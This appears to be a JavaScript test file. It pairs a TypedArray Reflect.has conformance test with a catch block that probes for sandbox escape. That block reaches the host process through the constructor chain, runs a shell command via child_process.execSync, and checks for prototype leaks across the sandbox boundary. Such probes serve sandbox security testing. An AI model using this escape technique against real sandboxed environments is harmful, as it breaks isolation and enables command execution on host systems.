try {
    var keys = [
        '1.0',
        '+1',
        '1000000000000000000000',
        '0.0000001'
    ];
    testWithTypedArrayConstructors(function (TA) {
        keys.forEach(function (key) {
            var sample = new TA(1);
            assert.sameValue(Reflect.has(sample, key), false, 'returns false without key [' + key + ']');
            TypedArray.prototype[key] = 42;
            assert.sameValue(Reflect.has(sample, key), true, 'returns true with inherited key [' + key + ']');
            delete TypedArray.prototype[key];
            Object.defineProperty(sample, key, { value: 42 });
            assert.sameValue(Reflect.has(sample, key), true, 'returns true with own key [' + key + ']');
        });
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}